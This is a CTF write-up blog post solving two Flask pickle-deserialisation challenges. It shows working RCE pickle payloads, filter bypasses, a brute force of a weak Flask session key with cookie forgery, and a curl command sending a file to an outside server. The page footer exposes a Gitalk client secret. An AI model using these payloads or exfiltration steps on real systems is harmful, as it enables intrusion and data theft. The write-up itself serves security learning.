+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import base64 import pickle from flask import Flask, request app = Flask(__name__) @app.route(&#x27;/&#x27;) def index(): with open(&#x27;app.py&#x27;, &#x27;r&#x27;) as f: return f.read() @app.route(&#x27;/calc&#x27;, methods=[&#x27;GET&#x27;]) def getFlag(): payload = request.args.get(&quot;payload&quot;) pickle.loads(base64.b64decode(payload).replace(b&#x27;os&#x27;, b&#x27;&#x27;)) return &quot;ganbadie!&quot; @app.route(&#x27;/readFile&#x27;, methods=[&#x27;GET&#x27;]) def readFile(): filename = request.args.get(&#x27;filename&#x27;).replace(&quot;flag&quot;, &quot;????&quot;) with open(filename, &#x27;r&#x27;) as f: return f.read() if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure>
+<p>给的是一些可以访问的路由什么的,我们先扫描一下目录<br>发现扫不出来<br>根目录，&#x2F;calc，&#x2F;readFile主要应该还有这两个可以访问的，但是直接在url后面加上这两个肯定是不行的<br>然后审计一下代码就可以发现，这里直接选择写opcode就可以了<br>然后我们将上面的代码再整理一下,方便观看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">代码如下：</span><br><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line">from flask import Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">这个函数级别的注解指明了当地址是根路径时，就调用下面的函数。  </span><br><span class="line">在app.route(’/TestB/’)中，TestB前后有斜杆，则访问时，是否在TestB后面加斜杠，Flask都会重定向到(/TestB/)中，且访问成功，</span><br><span class="line">若在app.route(’/TestA`)，TestA后无斜杠，则在访问时，则在访问时，若访问(/TestA/)，则会报错，访问(/TestA)，则访问成功。</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    with open(&#x27;app.py&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">        return f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/calc&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def getFlag():</span><br><span class="line">    payload = request.args.get(&quot;payload&quot;)    #get输入payload，在/calc目录</span><br><span class="line">    pickle.loads(base64.b64decode(payload).replace(b&#x27;os&#x27;, b&#x27;&#x27;))    #反序列化，字符替换,过滤os，但是我们可以发现他只过滤一次，所以我们可以双写绕过！！！</span><br><span class="line">    </span><br><span class="line">    return &quot;ganbadie!&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/readFile&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def readFile():            #可以把结果重定向到文件中,然后用readFile读。在/readFile目录</span><br><span class="line"></span><br><span class="line">    filename = request.args.get(&#x27;filename&#x27;).replace(&quot;flag&quot;, &quot;????&quot;)    #GET提交，把flag换成????，任意文件读取但是防止读取flag。</span><br><span class="line">    with open(filename, &#x27;r&#x27;) as f:</span><br><span class="line">        return f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=80)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class rayi(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># return eval,(&quot;__import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;ls / | tee a&#x27;)&quot;,)</span><br><span class="line">        return eval, (&quot;__import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;env | tee a.txt&#x27;)&quot;,)</span><br><span class="line"></span><br><span class="line">a = rayi()</span><br><span class="line">print(pickle.dumps(a))</span><br><span class="line">print(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure>
+<p>这里的os绕过建议采用这种方式，然后就是读env采用上述方法<br>最后读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:20807/calc?payload=gASVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnbycrJ3MnKS5zeXN0ZW0oJ2VudiB8IHRlZSBhLnR4dCcplIWUUpQu</span><br><span class="line">http://node5.anna.nssctf.cn:20807/readFile?filename=a.txt</span><br></pre></td></tr></table></figure>
+<h2 id="MTCTF-2022-easypickle"><a href="#MTCTF-2022-easypickle" class="headerlink" title="[MTCTF 2022]easypickle"></a>[MTCTF 2022]easypickle</h2><p>339分<br>反序列化Cookie伪造Python<br>题目描述<br>简单的pickle反序列化<br>总所周知呀，很多难的要死的题目也和你说，easy,ez,simple这些等等<br>这道题目给了一个附件我们下载下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line">from flask import Flask, session</span><br><span class="line">import os</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(2).hex()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def hello_world():</span><br><span class="line">    if not session.get(&#x27;user&#x27;):</span><br><span class="line">        session[&#x27;user&#x27;] = &#x27;&#x27;.join(random.choices(&quot;admin&quot;, k=5))</span><br><span class="line">    return &#x27;Hello &#123;&#125;!&#x27;.format(session[&#x27;user&#x27;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin&#x27;)</span><br><span class="line">def admin():</span><br><span class="line">    if session.get(&#x27;user&#x27;) != &quot;admin&quot;:</span><br><span class="line">        return f&quot;&lt;script&gt;alert(&#x27;Access Denied&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            a = base64.b64decode(session.get(&#x27;ser_data&#x27;)).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;)</span><br><span class="line">            if b&#x27;R&#x27; in a or b&#x27;i&#x27; in a or b&#x27;o&#x27; in a or b&#x27;b&#x27; in a:</span><br><span class="line">                raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;)</span><br><span class="line">            pickle.loads(base64.b64decode(session.get(&#x27;ser_data&#x27;)))</span><br><span class="line">            return &quot;ok&quot;</span><br><span class="line">        except:</span><br><span class="line">            return &quot;error!&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8888)</span><br></pre></td></tr></table></figure>
+<p>这个就是附件的内容，我们进行代码审计<br>这里可以看见两个路由，第一个就是对于你的admin的验证，第二个就是在你是admin的情况下，我们要写代码，然后主要就是对一些常见的关键字进行了过滤<br>先看代码中的key怎么生成的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(2).hex()</span><br><span class="line"></span><br><span class="line">逐步解析：</span><br><span class="line"></span><br><span class="line">    os.urandom(2)</span><br><span class="line"></span><br><span class="line">        从操作系统的熵源里取出 2 个字节的随机数据（范围是 0x0000 ~ 0xFFFF 之间的任意二进制值）。</span><br><span class="line"></span><br><span class="line">        这是加密安全级别的随机数，不能被预测。</span><br><span class="line"></span><br><span class="line">    .hex()</span><br><span class="line"></span><br><span class="line">        把这 2 个字节转换为 16 进制字符串。</span><br><span class="line"></span><br><span class="line">        2 个字节 = 16 位，每个字节对应 2 位 16 进制字符，所以会得到 4 个 16 进制字符。</span><br><span class="line"></span><br><span class="line">    举个例子：</span><br><span class="line"></span><br><span class="line">os.urandom(2)  → b&#x27;\xa3\x1f&#x27;</span><br><span class="line">.hex()         → &#x27;a31f&#x27;</span><br><span class="line"></span><br><span class="line">结果</span><br><span class="line"></span><br><span class="line">    这个 SECRET_KEY 实际上是一个长度为 4 位的十六进制字符串（取值范围是 &quot;0000&quot; 到 &quot;ffff&quot;）</span><br></pre></td></tr></table></figure>
+<p>这个我们之前是遇见过的，可以参照我之前的博客<br>先用脚本生成一个字典，主要是说来配合后面的爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">file_path=&#x27;./key.txt&#x27;</span><br><span class="line">with open(file_path, &#x27;w&#x27;) as f:</span><br><span class="line">    for i in range(1,9999):</span><br><span class="line">        key = os.urandom(2).hex()</span><br><span class="line">        f.write(&quot;\&quot;&#123;&#125;\&quot;\n&quot;.format(key))</span><br></pre></td></tr></table></figure>
+<p>前四行没有什么说的，没有的话会在当前路径下创建文件<br>第五行则是要按照题目的格式生成，第六行就是保证内容格式为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;3f7a&quot;</span><br><span class="line">&quot;9c2d&quot;</span><br><span class="line">&quot;e5b8&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>假设没有跑出来的话，我们可以将这个9999换为一个更大的数字<br>项目在<a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">https://github.com/Paradoxis/Flask-Unsign</a><br>下载<br>然后安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-unsign</span><br></pre></td></tr></table></figure>
+<p>然后将脚本得到的key.txt放入Flask-Unsign-master下<br>最后运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --unsign --cookie &quot;eyJ1c2VyIjoibmRuYW4ifQ.aNSoeQ.4gz91wLoSdGHsRz6NWrtyZMOs2c&quot; --wordlist key.txt</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">D:\ctf\ctf-web\cookie\Flask-Unsign-master&gt;flask-unsign --unsign --cookie &quot;eyJ1c2VyIjoiZGRtaW0ifQ.aNSymQ.aE9bLxnBhmMcJFgJiXgGNro4yrc&quot; --wordlist key.txt</span><br><span class="line">[*] Session decodes to: &#123;&#x27;user&#x27;: &#x27;ndnan&#x27;&#125;</span><br><span class="line">[*] Starting brute-forcer with 8 threads..</span><br><span class="line">[+] Found secret key after 44160 attempts</span><br><span class="line">&#x27;4f4a&#x27;</span><br><span class="line"></span><br><span class="line">D:\ctf\ctf-web\cookie\Flask-Unsign-master&gt;</span><br></pre></td></tr></table></figure>
+<p>然后用到之前学习到的知识要加密一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# python3 session3.py encode -s &quot;4f4a&quot; -t &quot;&#123;&#x27;user&#x27;:&#x27;admin&#x27;&#125;&quot;</span><br><span class="line">eyJ1c2VyIjoiYWRtaW4ifQ.aNSzTg.GaZCugyv3Y9NPtlzotNzPysFdcw</span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>伪造得到了session之后，我们来看看后面的反序列化逻辑<br>从session中获取ser_data键的值，然后替换掉一些字符，然后过滤R i o b,就没法用pker来生成payload了，这里直接手搓opcode了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(cos\nsystem\nS&#x27;calc&#x27;\nos.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+<p>然后现在只需要把这个base64编码一下，然后作为ser_data的值，写入session即可。因为没有回显，尝试了反弹shell无果后，选择了curl外带数据，然后直接外带的话，因为换行的原因，只显示第一行，所以说选择把命令执行结果写入文件，然后把文件的内容外带出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(cos\nsystem\nS&#x27;ls&gt;/3.txt&#x27;\nos.&#x27;&#x27;&#x27; #把ls的结果写入根目录的3.txt</span><br><span class="line">b&#x27;&#x27;&#x27;(cos\nsystem\nS&#x27;curl -T /3.txt http://xxxxxx&#x27;\nos.&#x27;&#x27;&#x27;  #外带/3.txt的内容到服务器上</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>接下来就是运用了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">print(base64.b64encode(b&#x27;&#x27;&#x27;(cos\nsystem\nS&#x27;ls&gt;/3.txt&#x27;\nos.&#x27;&#x27;&#x27;))</span><br></pre></td></tr></table></figure>
+<p>得到：KGNvcwpzeXN0ZW0KUydscz4vMy50eHQnCm9zLg&#x3D;&#x3D;<br>另一个得到KGNvcwpzeXN0ZW0KUydjdXJsIC1UIC8zLnR4dCBodHRwOi8vMTAxLjQzLjY2LjY3OjEyMzQ1Jwpvcy4&#x3D;<br>语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 session3.py encode -s &quot;4f4a&quot; -t &quot;&#123;&#x27;user&#x27;:&#x27;admin&#x27;,&#x27;ser_data&#x27;:&#x27;KGNvcwpzeXN0ZW0KUydscz4vMy50eHQnCm9zLg==&#x27;&#125;&quot;</span><br><span class="line"></span><br><span class="line">python3 session3.py encode -s &quot;4f4a&quot; -t &quot;&#123;&#x27;user&#x27;:&#x27;admin&#x27;,&#x27;ser_data&#x27;:&#x27;KGNvcwpzeXN0ZW0KUydjdXJsIC1UIC8zLnR4dCBodHRwOi8vMTAxLjQzLjY2LjY3OjEyMzQ1Jwpvcy4=&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>得到的应该是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# python3 session3.py encode -s &quot;4f4a&quot; -t &quot;&#123;&#x27;user&#x27;:&#x27;admin&#x27;,&#x27;ser_data&#x27;:&#x27;KGNvcwpzeXN0ZW0KUydscz4vMy50eHQnCm9zLg==&#x27;&#125;&quot;</span><br><span class="line">eyJ1c2VyIjoiYWRtaW4iLCJzZXJfZGF0YSI6IktHTnZjd3B6ZVhOMFpXMEtVeWRzY3o0dk15NTBlSFFuQ205ekxnPT0ifQ.aNS0zw.dMGJe4BJQFW2aPb2yX40Ck9DRV0</span><br><span class="line"></span><br><span class="line">┌──(rootpython3 session3.py        -s &quot;4f4a&quot; -t &quot;&#123;&#x27;user&#x27;:&#x27;admin&#x27;,&#x27;ser_data&#x27;:&#x27;KGNvcwpzeXN0ZW0KUydjdXJsIC1UIC8zLnR4dCBodHRwOi8vMTAxLjQzLjY2LjY3OjEyMzQ1Jwpvcy4=&#x27;&#125;&quot; </span><br><span class="line">eyJ1c2VyIjoiYWRtaW4iLCJzZXJfZGF0YSI6IktHTnZjd3B6ZVhOMFpXMEtVeWRqZFhKc0lDMVVJQzh6TG5SNGRDQm9kSFJ3T2k4dk1UQXhMalF6TGpZMkxqWTNPakV5TXpRMUp3cHZjeTQ9In0.aNS1Kw.W5BIrWVEHHDaDti-TijIBOWFbWo</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>但是我不知道什么原因，反正我的就是不出网，连接不上<br>参考博客：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2134975">https://cloud.tencent.com/developer/article/2134975</a><br>and<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52091458/article/details/127448151?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522bf3aab8712564d7e8823c626db6cce75%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=bf3aab8712564d7e8823c626db6cce75&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127448151-null-null.142%5Ev102%5Epc_search_result_base4&utm_term=%5BMTCTF%202022%5Deasypickle&spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_52091458/article/details/127448151?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522bf3aab8712564d7e8823c626db6cce75%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=bf3aab8712564d7e8823c626db6cce75&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127448151-null-null.142^v102^pc_search_result_base4&amp;utm_term=%5BMTCTF%202022%5Deasypickle&amp;spm=1018.2226.3001.4187</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">wuk0Ng</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://web-wuk0ng.github.io/2025/09/25/py-web/">https://web-wuk0ng.github.io/2025/09/25/py-web/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">wuk0Ng</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                                    <span class="chip bg-color">比赛</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/aliyunpay.png" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat1.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <!-- 引入 Gitalk 官方 CSS（国内 CDN） -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+<!-- 引入主题自定义 CSS（如有需要，若 my-gitalk.css 是本地文件则保留原路径） -->
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+  <div class="comment_headling">
+    <i class="fas fa-comments fa-fw"></i>
+    <span>评论</span>
+  </div>
+  <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<!-- 引入 Gitalk 官方 JS（国内 CDN） -->
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+  let gitalk = new Gitalk({
+    clientID: 'Ov23liTNlK9NLcZwFSo8',
+    clientSecret: '7472cd54d6ca5e38d14f6d1b5176299bb4cf4ebe',
+    repo: 'blog---comments',
+    owner: 'web-wuk0Ng',
+    admin: ["web-wuk0Ng"],
+    id: '2025-09-25T12-00-00',
+    distractionFreeMode: false
+  });
+
+  gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2025/09/25/py-web/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="py-web">
+                        
+                        <span class="card-title">py-web</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-09-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                    记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                        <span class="chip bg-color">比赛</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/09/03/shell%E5%92%8C%E6%8F%90%E6%9D%83CTF%E5%AE%9E%E6%88%98/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="shell&amp;suid实战">
+                        
+                        <span class="card-title">shell&amp;suid实战</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-09-03
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                    记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                        <span class="chip bg-color">比赛</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
